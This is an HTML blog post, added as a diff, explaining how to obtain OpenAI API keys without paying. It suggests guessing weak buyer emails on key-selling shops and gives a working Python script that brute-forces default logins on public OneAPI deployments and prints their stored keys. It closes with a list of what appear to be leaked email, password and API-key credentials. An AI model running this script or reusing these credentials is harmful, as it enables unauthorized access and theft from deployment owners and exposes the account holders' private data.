@@ -1,0 +1,277 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>白嫖OpenAPI APIKEY思路 | flyD</title>
+
+<link rel="shortcut icon" href="https://flyd.uk/favicon.ico?v=1699457449077">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://flyd.uk/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dart.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/go.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/python.min.js"></script>
+
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            flyD
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699457449077"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    白嫖OpenAPI APIKEY思路
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-09-25 ·
+                    </time>
+                    
+                        <a href="https://flyd.uk/ssoVmRBtr/" class="post-tags">
+                            # OpenAI
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <!-- more -->
+<h2 id="思路一-猜邮箱">思路一: 猜邮箱</h2>
+<p>找一些卖Key的发卡网站, 在订单查询中猜其他人购买的邮箱<br>
+<a href="https://eylink.cn/">https://eylink.cn/</a><br>
+<a href="https://nbfaka.com/ds/">https://nbfaka.com/ds/</a></p>
+<p>常见的弱邮箱:</p>
+<pre><code>123456@qq.com
+123@qq.com
+1@qq.com
+123123@qq.com
+666@qq.com
+888@qq.com
+1@1.com
+1@1.1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://flyd.uk/post-images/1699122584950.png" alt="" loading="lazy"></figure>
+<h2 id="思路二-爆破弱口令">思路二: 爆破弱口令</h2>
+<p>爆破别人搭建好的OneAPI弱口令, OneAPI是OpenAI 接口管理 &amp; 分发系统, 默认搭建完成后用户名是root密码是123456, 很多人部署到公网后不会修改默认密码, 所以可以直接爆破白嫖别人的APIKEY</p>
+<p>项目地址: <a href="https://github.com/songquanpeng/one-api">https://github.com/songquanpeng/one-api</a></p>
+<p>可以使用<code>OneAPI</code>这个关键字在测绘引擎查找别人部署在公网的示例, 然后将IP或者URL保存在<code>url.txt</code>中, 即可自动爆破</p>
+<p>一种爆破代码示例:</p>
+<pre><code class="language-python">import requests
+import urllib3.contrib.pyopenssl
+urllib3.contrib.pyopenssl.inject_into_urllib3()
+urls = []
+def get_url():
+    with open('url.txt', 'r') as f:
+        for line in f:
+            urls.append(line.strip())
+    return urls
+
+def try_login_and_get_token(url):
+    payloads = [{&quot;username&quot;:&quot;root&quot;,&quot;password&quot;:&quot;123456&quot;}, 
+               {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}, 
+               {&quot;username&quot;:&quot;root&quot;,&quot;password&quot;:&quot;root&quot;}, 
+               {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}, 
+               ]
+    headers = {&quot;Content-Type&quot;: &quot;application/json&quot;, 
+               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;}
+    session = requests.session()
+    session.headers = headers
+
+    for payload in payloads:
+        try:
+            if &quot;用户名&quot; in session.post(url + &quot;/api/user/login&quot;, json=payload, timeout=1).text:
+                return
+            else:
+                dta = session.get(url + &quot;/api/token/?p=0&quot;, timeout=1).json()['data']
+                if len(dta) != 0:
+                    print(url)
+                    for i in dta:
+                       print(&quot;sk-&quot; + i['key'])
+                    print()
+                return
+        except:
+            pass
+
+
+if __name__ == '__main__':
+    get_url()
+    for item in urls:
+        try_login_and_get_token(item)
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://flyd.uk/post-images/1699122575347.png" alt="" loading="lazy"></figure>
+<h2 id="api分享">API分享</h2>
+<pre><code>kuoyeshokri4@hotmail.com----sChTPS32----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
+u.iy.gf.bf.h.y.ocn.g1.69@gmail.com----ubje^K73n6CO----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
+sipkemusodao@hotmail.com----UhxxiR98----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
+y.b.b.x.k.tx.c.tej.d.772@gmail.com----Ge^ZZBfio----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
+jj.mp.qcyb.o.d.i.w.l.y.08@gmail.com----TrjUp7wxXu^T----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
+rg.a.d.g.n.0.32853.128@gmail.com----SJR9GnD!PCkYC----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
+bnvexod@outlook.com----ZAQAfas616----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
+nqmabqlgf@outlook.com----BSQtd5365----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
+lqsgkgdaj@hotmail.com----RCTQsg591----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
+vhszley@outlook.com----EREToyy6936----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
+uikfrdkjkr@hotmail.com----ZDJmq053----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
+ztkdqegb@hotmail.com----JRIUdld76----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
+lynenwoconshand@mail.com----NtlHVqfgqd----7KJfPwayx----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
+hasillegangti@mail.com----VqumZwcEeQ----cwpeu3ZHA----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
+nrecarimneili@mail.com----prXIkKIkTP----jqHqSYYD7----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
+coadilytoti@mail.com----RpDOFqltjS----0ydTkz8lc----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
+fiddtovederon@mail.com----wQVaMCqrtP----QD5KWxzyR----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
+sforlanloaphardist@mail.com----CAJrWQFwWN----tLe1dgbcZ----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
+erofelitup@mail.com----DRUxgdhClX----QyR1r39Rc----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
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://flyd.uk/post/safeline-guide/" class="post-title gt-a-link">
+                    长亭雷池WAF使用教程
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/xiaoWangSec" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    
+    <div class="slogan gt-c-content-color-first"><script type='text/javascript'>
+$.get("https://v1.hitokoto.cn/",function(data,status){
+  if (status == 'success'){
+    $('.slogan.gt-c-content-color-first').text(data.hitokoto);
+  }else{
+    $('.hitokoto').text('奈何明月照沟渠');
+  }
+});
+</script></div>
+
+    <!-- <div class="footer-info">
+        
+    </div> -->
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://flyd.uk/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
